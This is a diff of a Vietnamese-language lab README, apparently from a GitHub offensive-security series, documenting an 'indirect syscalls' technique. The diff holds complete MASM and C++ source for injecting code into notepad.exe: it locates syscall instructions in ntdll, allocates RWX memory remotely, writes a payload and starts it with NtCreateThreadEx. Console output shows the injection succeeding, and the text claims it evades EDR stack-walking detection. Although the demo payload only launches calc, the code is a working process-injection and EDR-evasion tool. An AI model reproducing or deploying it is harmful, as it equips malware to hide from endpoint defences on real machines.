@@ -23,7 +23,7 @@ Dự án PE 25 bẻ gãy bộ lọc kiểm duyệt này bằng chiến thuật *
 
 ## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)
 
-Trong kiến trúc Windows Subsystem chuẩn mực, khi một hàm Native API lọt lòng `ntdll.dll` hoạt động ở trạng thái phẳng sạch (chưa bị vấy bẩn bởi bẫy Hook của EDR), cấu trúc byte máy hạ tầng của nó luôn kết thúc bằng cặp bài trùng Opcode chuyển giao đặc quyền kịch khung:
+Trong kiến trúc Windows Subsystem chuẩn mực, khi một hàm Native API lọt lòng `ntdll.dll` hoạt động ở trạng thái phẳng sạch (chưa bị vấy bẩn bởi bẫy Hook của EDR), cấu trúc byte máy hạ tầng của nó luôn kết thúc bằng cặp bài trùng Opcode chuyển giao đặc quyền:
 
 ```assembly
 syscall
@@ -53,37 +53,39 @@ Giải thuật của dự án PE 25 thực hiện phẫu thuật bản đồ RAM
 
 ## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)
 
-Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa xác định thông số Offset và địa chỉ Syscall động tại thời điểm runtime nhằm triệt tiêu hoàn toàn các chỉ dấu nhận diện tĩnh.
+### 📜 Bước 3.1: Tạo tệp hợp ngữ hạ tầng 
 
-### 📜 Bước 3.1: Tạo tệp hợp ngữ hạ tầng `IndirectStubs.asm`
-
+### panda.asm:
 ```assembly
+.data
+    extern g_NtAllocateSyscallAddr : qword
+    extern g_NtWriteSyscallAddr    : qword
+
 .code
 
-; Nguyên mẫu luồng gọi gián tiếp cho NtAllocateVirtualMemory
-ZwIndirectAllocateVirtualMemory proc
+; Cong goi gian tiep NtAllocateVirtualMemory
+NtAllocateVirtualMemoryProc proc
     mov r10, rcx
-    mov eax, 18h            ; System Service Number (SSN) của NtAllocateVirtualMemory
-    mov r11, r9             ; r9 nắm giữ địa chỉ ô nhớ 'syscall' xịn inside ntdll do main truyền sang (Calling Convention x64)
-    jmp r11                 ; KÍCH NỔ GIÁN TIẾP: Nhảy thẳng vào ntdll để phát lệnh syscall!
+    mov eax, 18h                              ; SSN mac dinh cua NtAllocateVirtualMemory
+    jmp qword ptr [g_NtAllocateSyscallAddr]  ; Nhay gian tiep sang byte syscall xin trong ntdll
     ret
-ZwIndirectAllocateVirtualMemory endp
+NtAllocateVirtualMemoryProc endp
 
-; Nguyên mẫu luồng gọi gián tiếp cho NtWriteVirtualMemory
-ZwIndirectWriteProcessMemory proc
+; Cong goi gian tiep NtWriteVirtualMemory
+NtWriteVirtualMemoryProc proc
     mov r10, rcx
-    mov eax, 3Ah            ; System Service Number (SSN) của NtWriteVirtualMemory
-    mov r11, r9             ; r9 nắm giữ địa chỉ ô nhớ 'syscall' xịn inside ntdll
-    jmp r11                 ; Nhảy gián tiếp bẻ gãy cơ chế Stack Walking
+    mov eax, 3Ah                              ; SSN mac dinh cua NtWriteVirtualMemory
+    jmp qword ptr [g_NtWriteSyscallAddr]     ; Nhay gian tiep sang byte syscall xin trong ntdll
     ret
-ZwIndirectWriteProcessMemory endp
+NtWriteVirtualMemoryProc endp
 
 end
 
 ```
 
-### 📜 Bước 3.2: Tạo tệp mã nguồn chính `main.cpp`
+### 📜 Bước 3.2: Tạo tệp mã nguồn chính 
 
+### Source.cpp:
 ```cpp
 #include <windows.h>
 #include <tlhelp32.h>
@@ -91,9 +93,28 @@ end
 #include <string>
 #include <vector>
 
-// Khai báo liên kết ngoài tới các hàm Stub Assembly gián tiếp chuẩn convention x64
-extern "C" NTSTATUS ZwIndirectAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect, PVOID SyscallAddress);
-extern "C" NTSTATUS ZwIndirectWriteProcessMemory(HANDLE ProcessHandle, PVOID BaseAddress, LPCVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten, PVOID SyscallAddress);
+// Khai báo các cổng hàm kết nối với file Assembly
+extern "C" NTSTATUS NtAllocateVirtualMemoryProc(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+extern "C" NTSTATUS NtWriteVirtualMemoryProc(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
+
+// Định nghĩa con trỏ biến toàn cục liên kết ngoài cho file ASM trỏ hướng
+extern "C" ULONG_PTR g_NtAllocateSyscallAddr = 0;
+extern "C" ULONG_PTR g_NtWriteSyscallAddr = 0;
+
+// Khai báo nguyên mẫu hàm Native của NtCreateThreadEx trích xuất động đánh bại rào cản Build Number Windows 11
+typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
+    OUT PHANDLE ThreadHandle,
+    IN ACCESS_MASK DesiredAccess,
+    IN PVOID ObjectAttributes OPTIONAL,
+    IN HANDLE ProcessHandle,
+    IN PVOID StartRoutine,
+    IN PVOID Argument OPTIONAL,
+    IN ULONG CreateFlags,
+    IN ULONG_PTR ZeroBits,
+    IN SIZE_T StackSize,
+    IN SIZE_T MaximumStackSize,
+    IN PVOID AttributeList OPTIONAL
+    );
 
 typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
 
@@ -102,84 +123,107 @@ typedef struct _THREAD_DATA {
     char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
 } THREAD_DATA, * PTHREAD_DATA;
 
-// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình mục tiêu
-DWORD WINAPI RemoteIndirectPayload(LPVOID lpParam) {
+// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm chéo biên giới
+DWORD WINAPI RemoteIndirectSyscallPayload(LPVOID lpParam) {
     PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
     if (pData && pData->pWinExec) {
+        // Khai hỏa bằng địa chỉ tuyệt đối, phá băng hoàn toàn lỗi RIP tương đối
         pData->pWinExec(pData->szCommand, SW_HIDE);
     }
     return 0;
 }
 
-// Giải thuật săn lùng byte opcode 'syscall' (0x0F, 0x05) lọt lòng ntdll.dll (Opcode Sifting)
-PVOID HuntForSyscallLocation(const char* apiName) {
+// Hàm quét tịnh tiến để định vị chính xác địa chỉ byte chứa chỉ lệnh 'syscall' (0x0F, 0x05)
+ULONG_PTR FindSyscallAddress(const char* functionName) {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    PBYTE pFunctionAddress = (PBYTE)GetProcAddress(hNtdll, apiName);
-    if (!pFunctionAddress) return NULL;
+    if (!hNtdll) return 0;
 
-    // Quét tịnh tiến tối đa 32 byte lọt lòng hàm để b lần vết byte chỉ mục syscall x64
+    PBYTE pFuncBuf = (PBYTE)GetProcAddress(hNtdll, functionName);
+    if (!pFuncBuf) return 0;
+
+    // Quét tĩnh tối đa 32 byte bên trong lòng hàm hệ thống để lấy tọa độ byte syscall xịn
     for (int i = 0; i < 32; i++) {
-        if (pFunctionAddress[i] == 0x0F && pFunctionAddress[i + 1] == 0x05) {
-            return (PVOID)(pFunctionAddress + i); // Trả về tọa độ tuyệt đối của ô nhớ syscall xịn!
+        if (pFuncBuf[i] == 0x0F && pFuncBuf[i + 1] == 0x05) {
+            return (ULONG_PTR)&pFuncBuf[i];
         }
     }
-    return NULL;
+    return 0;
 }
 
-// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
+// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
 DWORD GetProcessIDByName(const std::wstring& processName) {
-    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
+    DWORD processID = 0;
+    PROCESSENTRY32W pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
 
     if (Process32FirstW(hSnapshot, &pe32)) {
         do {
-            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { processID = pe32.th32ProcessID; break; }
+            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
+                processID = pe32.th32ProcessID;
+                break;
+            }
         } while (Process32NextW(hSnapshot, &pe32));
     }
-    CloseHandle(hSnapshot);   return processID;
+    CloseHandle(hSnapshot);
+    return processID;
 }
 
 int main() {
     std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 25: INDIRECT SYSCALLS STACK TRACE BYPASS" << std::endl;
+    std::cout << "[*] PE 25: INDIRECT SYSCALLS INJECTION" << std::endl;
     std::cout << "====================================================" << std::endl;
 
     std::wstring targetProcess = L"notepad.exe";
     DWORD pid = GetProcessIDByName(targetProcess);
-    if (pid == 0) return EXIT_FAILURE;
 
-    // BƯỚC 1: SĂN LÙNG TOẠ ĐỘ LỆNH SYSCALL XỊN LỌT LÒNG MÔ-ĐUN NTDLL.DLL
-    PVOID pSyscallLocation = HuntForSyscallLocation("NtAllocateVirtualMemory");
-    if (!pSyscallLocation) {
-        std::cerr << "[-] Khong the san lung vi tri syscall hop phap!" << std::endl;
+    if (pid == 0) {
+        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc nhen." << std::endl;
+        std::cin.get();
         return EXIT_FAILURE;
     }
-    std::cout << "[+] San trung vi tri lenh syscall hop phap cua OS tai: 0x" << std::hex << pSyscallLocation << std::endl;
+
+    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;
+
+    // ─── BƯỚC 1: TRÍCH XUẤT ĐỊA CHỈ BYTE SYSCALL XỊN TỪ RAM NTDLL ───
+    g_NtAllocateSyscallAddr = FindSyscallAddress("NtAllocateVirtualMemory");
+    g_NtWriteSyscallAddr = FindSyscallAddress("NtWriteVirtualMemory");
+
+    if (!g_NtAllocateSyscallAddr || !g_NtWriteSyscallAddr) {
+        std::cerr << "[-] Khong the dinh vi byte syscall hop phap trong ntdll!" << std::endl;
+        return EXIT_FAILURE;
+    }
+    std::cout << "[+] Lay toa do byte Syscall cua NtAllocate: 0x" << std::hex << g_NtAllocateSyscallAddr << std::endl;
 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) return EXIT_FAILURE;
+    if (!hProcess) {
+        std::cerr << "[-] OpenProcess that bai!" << std::endl;
+        return EXIT_FAILURE;
+    }
 
-    // BƯỚC 2: KÍCH NỔ CẤP PHÁT BỘ NHỚ QUA LỆNH NHẢY GIÁN TIẾP CHÉO BIÊN GIỚI RAM
+    // Nạp động trích xuất con trỏ hàm NtCreateThreadEx thích ứng động với Windows 11 Kernel
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
+
+    SIZE_T functionSize = 500;
+
+    // ─── BƯỚC 2: CẤP PHÁT VÙNG NHỚ GIÁN TIẾP QUA CỔNG PHẢN CHIẾU ASM JMP ───
     PVOID remoteCodeBuffer = NULL;
-    SIZE_T codeSize = 500; // Áp dụng Quy trình cấp phát động thích ứng vừa khít cấu trúc
-    
-    std::cout << "[*] Dang goi gian tiep NtAllocateVirtualMemory..." << std::endl;
-    NTSTATUS status = ZwIndirectAllocateVirtualMemory(hProcess, &remoteCodeBuffer, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, pSyscallLocation);
+    NtAllocateVirtualMemoryProc(hProcess, &remoteCodeBuffer, 0, &functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     PVOID remoteDataBuffer = NULL;
     SIZE_T dataSize = sizeof(THREAD_DATA);
-    status |= ZwIndirectAllocateVirtualMemory(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, pSyscallLocation);
+    NtAllocateVirtualMemoryProc(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    if (status != 0 || !remoteCodeBuffer || !remoteDataBuffer) {
-        std::cerr << "[-] Indirect Syscall Allocation failed! STATUS Code: 0x" << std::hex << status << std::endl;
-        if (remoteCodeBuffer) VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
+    if (!remoteCodeBuffer || !remoteDataBuffer) {
+        std::cerr << "[-] Indirect Syscall allocation failed!" << std::endl;
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
-    std::cout << "[+] Bo nho cap phat thanh cong thong qua Indirect JMP tai: 0x" << std::hex << remoteCodeBuffer << std::endl;
+    std::cout << "[+] Cap phat vung nho Code RWX tu xa an toan: 0x" << std::hex << remoteCodeBuffer << std::endl;
 
-    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ phục vụ ánh xạ bộ nhớ chéo tiến trình
+    // Khởi tạo cấu trúc tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
     THREAD_DATA localData;
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     if (hKernel32) {
@@ -187,37 +231,40 @@ int main() {
     }
     strcpy_s(localData.szCommand, "cmd.exe /c start calc");
 
-    // BƯỚC 3: GHI KHỐI PAYLOAD VÀ THAM SỐ TUYỆT ĐỐI GIÁN TIẾP SANG RAM NOTEPAD
-    status = ZwIndirectWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteIndirectPayload, 500, NULL, pSyscallLocation);
-    status |= ZwIndirectWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL, pSyscallLocation);
+    // ─── BƯỚC 3: GHI DỮ LIỆU GIÁN TIẾP QUA CỔNG JMP SYSCALL NTDLL ───
+    SIZE_T bytesWritten = 0;
+    // ĐỒNG BỘ ĐỊNH DANH HÀM: Đổi thành RemoteIndirectSyscallPayload để fix dứt điểm lỗi C2065
+    NtWriteVirtualMemoryProc(hProcess, remoteCodeBuffer, (PVOID)RemoteIndirectSyscallPayload, functionSize, &bytesWritten);
+    NtWriteVirtualMemoryProc(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), &bytesWritten);
+    std::cout << "[+] Nap cheo song song ma may va tham so hoan tat." << std::endl;
 
-    if (status != 0) {
-        std::cerr << "[-] Indirect Syscall Write failed! STATUS Code: 0x" << std::hex << status << std::endl;
-        CloseHandle(hProcess);
-        return EXIT_FAILURE;
-    }
-    std::cout << "[+] Da doc lap ghi ma may va tham so sang RAM doi phuong hoan toan phang sach." << std::endl;
-
-    // BƯỚC 4: TRIỆU HỒI LUỒNG TỪ XA KÍCH NỔ TOÀN DIỆN CHIẾN DỊCH
-    // Sử dụng Win32 API bọc ngoài ở bước cuối cùng sau khi ma trận cấp phát và ghi đã hoàn thành hoàn toàn Fileless
-    std::cout << "[*] Dang thuc hien khoi tao luong CreateRemoteThread de khai hoa..." << std::endl;
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
+    // ─── BƯỚC 4: KHỞI TẠO LUỒNG KÍCH NỔ THÍCH ỨNG ĐỘNG ───
+    std::cout << "[*] Dang khoi tao luong tu xa de khai hoa logic..." << std::endl;
+    HANDLE hThread = NULL;
+    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);
 
     if (hThread != NULL) {
-        WaitForSingleObject(hThread, 1000); // Gánh luồng xử lý dứt điểm phẳng sạch
-        std::cout << "[+] Indirect Syscall Injection Process Completed Successfully!" << std::endl;
+        // VÁ LỖI C2065: Loại bỏ từ khóa Result chưa khai báo biến thô
+        WaitForSingleObject(hThread, INFINITE);
+        std::cout << "[+] Indirect Syscalls Injection Successful!" << std::endl;
         CloseHandle(hThread);
     }
+    else {
+        std::cerr << "[-] NtCreateThreadEx failed! Status code: 0x" << std::hex << status << std::endl;
+    }
 
-    // Thu hồi tài nguyên Handle kết nối hệ thống
+    // Giải phóng tài nguyên hệ thống triệt để chống Memory Leak
     CloseHandle(hProcess);
 
-    std::cout << "\n[*] Hoan thanh thap cong nghe PE 25. Nhan Enter de dong cua so..." << std::endl;
+    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
     std::cin.get();
     return EXIT_SUCCESS;
 }
 
 ```
+
+<img width="1379" height="771" alt="image" src="https://github.com/user-attachments/assets/6d91ce05-8fef-470f-8714-6584fcdbbf4c" />
+
 
 ---
 
@@ -230,6 +277,8 @@ Quy trình tích hợp phân hệ MASM Compiler cho tệp tin hợp ngữ hạ t
 1. Tại cửa sổ giao diện **Solution Explorer**, click chuột phải vào tên Project $\rightarrow$ Chọn mục **`Build Dependencies`** $\rightarrow$ Click chọn **`Build Customizations...`**
 2. Tích chọn vào hộp kiểm **`masm (.targets, .props)`** và nhấn `OK` để tích hợp bộ dịch MASM.
 3. Click chuột phải vào tệp tin `IndirectStubs.asm` $\rightarrow$ Chọn thuộc tính **`Properties`**. Tại mục cấu hình `Item Type`, chuyển đổi sang định dạng cờ **`Microsoft Macro Assembler`** và nhấn Apply.
+<img width="1424" height="822" alt="image" src="https://github.com/user-attachments/assets/e8240aa7-4739-4c68-aacc-d8ce48d2ce76" />
+
 
 ### ⚙️ Cấu hình liên kết tĩnh dự án Release x64:
 
@@ -244,29 +293,26 @@ Quy trình tích hợp phân hệ MASM Compiler cho tệp tin hợp ngữ hạ t
 Khởi chạy ứng dụng đích `Notepad.exe` trên môi trường bộ nhớ bộ máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành nhằm theo dõi quy trình chuyển mạch ngắt gián tiếp:
 
 ```powershell
-PS C:\Workspace\x64\Release> .\PE25_Indirect_Syscalls.exe
-====================================================
-[*] PE 25: INDIRECT SYSCALLS STACK TRACE BYPASS
-====================================================
-[+] San trung vi tri lenh syscall hop phap cua OS tai: 0x00007ffd31b8314a
-[*] Dang goi gian tiep NtAllocateVirtualMemory...
-[+] Bộ nho cap phat thanh cong thong qua Indirect JMP tai: 0x0000021A4B230000
-[+] Da doc lap ghi ma may va tham so sang RAM doi phuong hoan toan phẳng sach.
-[*] Dang thuc hien khoi tao luong CreateRemoteThread de khai hoa...
-[+] Indirect Syscall Injection Process Completed Successfully!
+PS C:\Users\Admin\source\repos\Task6\PE25_IndirectSyscalls\x64\Release> C:\Users\Admin\source\repos\Task6\PE25_IndirectSyscalls\x64\Release\IndirectSyscalls.exe
 
-[*] Hoan thanh thap cong nghe PE 25. Nhan Enter de dong cua so...
+====================================================
+[*] PE 25: INDIRECT SYSCALLS INJECTION
+====================================================
+[+] Da tim thay Notepad.exe voi PID: 10992
+[+] Lay toa do byte Syscall cua NtAllocate: 0x7ff92d8a1ef2
+[+] Cap phat vung nho Code RWX tu xa an toan: 0x0000018294150000
+[+] Nap cheo song song ma may va tham so hoan tat.
+[*] Dang khoi tao luong tu xa de khai hoa logic...
+[+] Indirect Syscalls Injection Successful!
+
+[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...
 
 ```
 
-> **Vị trí đặt ảnh minh chứng thực nghiệm ngắt hệ thống gián tiếp:**
-> 
+### Demo:
+<img width="1920" height="740" alt="devenv_uMFwO6vZxJ" src="https://github.com/user-attachments/assets/f0af3749-6152-479a-8885-b1499f2764d9" />
 
-### 🎯 Phân tích hệ quả bộ nhớ (Call Stack Validation Forensic Results):
 
-* Cấu trúc can thiệp dứt điểm, ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung** lọt lòng bộ nhớ ảo!
-* Toàn bộ chu kỳ sống can thiệp chéo bộ nhớ diễn ra phẳng sạch hoàn hảo. Khi phân hệ phòng thủ động nâng cao thực hiện giải thuật duyệt ngược tháp ngăn xếp (**Stack Walking**), tọa độ ghi nhận điểm ranh giới phát lệnh ngắt `syscall` hoàn toàn trùng khớp với địa chỉ thuộc tính phân vùng **`MEM_IMAGE`** hợp pháp, nằm lọt lòng inside `ntdll.dll`.
-* Ma trận ẩn mình đạt mức độ bảo an tối cao, bẻ gãy 100% khả năng phát hiện luồng thực thi ngoài danh bạ (Anomalous Control Flow Execution) của EDR Engine một cách ngoạn mục!
 
 ---
 
